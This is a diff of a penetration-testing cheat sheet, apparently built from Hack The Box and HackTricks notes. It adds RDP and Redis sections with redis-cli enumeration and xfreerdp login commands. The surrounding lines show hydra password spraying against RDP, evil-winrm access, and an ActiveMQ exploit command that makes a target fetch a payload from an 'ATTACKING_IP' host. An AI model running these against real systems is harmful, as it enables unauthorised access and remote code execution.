@@ -110,6 +110,8 @@ SHOW tables;
 SELECT * FROM <TABLE>;
 ```
 # RDP (3389)
+Developed by Microsoft, the Remote Desktop Protocol (RDP) is designed to enable a graphical interface connection between computers over a network. To establish such a connection, RDP client software is utilized by the user, and concurrently, the remote computer is required to operate RDP server software. This setup allows for the seamless control and access of a distant computer's desktop environment, essentially bringing its interface to the user's local device. [^2]
+## Ex. Service: ms-wbt-server (Microsoft Terminal Services)
 ## Enumeration
 ### Automatic
 ```bash
@@ -134,11 +136,11 @@ $ hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
 ### xfreerdp
 #### Fixed Screen:
 ```bash
-$ xfreerdp /u:<USER> /p:<PASSWORD> /cert:ignore /v:10.10.73.136 /workarea /tls-seclevel:0
+xfreerdp /u:<USER> /p:<PASSWORD> /cert:ignore /v:10.10.73.136 /workarea /tls-seclevel:0
 ```
 #### Adjustable Screen:
 ```bash
-$ xfreerdp /u:admin /p:password /cert:ignore /v:10.10.15.71  /tls-seclevel:0 /smart-sizing
+xfreerdp /u:admin /p:password /cert:ignore /v:10.10.15.71  /tls-seclevel:0 /smart-sizing
 ```
 # Distcc (3632)
 Distcc is a distributed compiler tool that speeds up compilation by offloading tasks to other networked systems running the `distccd` daemon.
@@ -164,6 +166,55 @@ Microsoft HTTPAPI (HTTP API) is a component of Windows that provides the underly
 ## Usage
 ```bash
 evil-winrm -i <IP> -u <USER> -p <PASSWORD>
+```
+# Redis (6379)
+Redis (**RE**mote **DI**ctionary **S**erver) is an open-source advanced NoSQL key-value data store used as a 
+database, cache, and message broker. This is an in-memory data structure (stored in the server's RAM). The data is stored in a dictionary format having key-value pairs. It is typically used for short term storage of data that needs fast retrieval. Redis does backup data to hard drives 
+to provide consistency.[^1]
+## The server
+Redis runs as server-side software so its core functionality is in its server component. The server listens for 
+connections from clients, programmatically or through the command-line interface.[^1]
+## The CLI
+The command-line interface (CLI) is a powerful tool that gives you complete access to Redis’s data and its 
+functionalities if you are developing a software or tool that needs to interact with it.[^1]
+## Database
+The database is stored in the server's RAM to enable fast data access. Redis also writes the contents of the 
+database to disk at varying intervals to persist it as a backup, in case of failure. [^1]
+## Connection
+```bash
+redis-cli -h <IP>
+```
+## Server Info
+```redis-cli
+info
+```
+Ex Result:
+```redis-cli
+# Server
+redis_version:5.0.7
+redis_git_sha1:00000000
+redis_git_dirty:0
+
+[** SNIP **]
+
+# Keyspace
+db0:keys=4,expires=0,avg_ttl=0
+```
+The keyspace section provides statistics on the main dictionary of each database. The statistics include the 
+number of keys, and the number of keys with an expiration.In the above example, under the 
+Keyspace section, we can see that only one database exists with index 0.
+
+## Selecting a Database 
+```redis-cli
+select <#>
+```
+## List all Keys in a Database
+```redis-cli
+keys *
+```
+## Get a key from the Database
+```redis-cli
+get <KEY NAME>
 ```
 
 # STOMP (61613, 61616)
@@ -217,3 +268,5 @@ go run main.go -i TARGET_IP -p PORT=61616 -u http://ATTACKING_IP:80/poc-linux.xm
 $ nc <IP> <PORT>
 ```
 
+[^1]: dotguy. “Redeemer Write-Up.” Https://App.Hackthebox.Com/, Hack The Box, blob://app.hackthebox.com/d5cf9163-a224-4a41-aa5c-4bfff818c408. Accessed 18 Sept. 2024. 
+[^2]: "3389 - Pentesting RDP". Https://book.hacktricks.xyz/, HackTricks, https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp. Accessed 18 Sept. 2024.
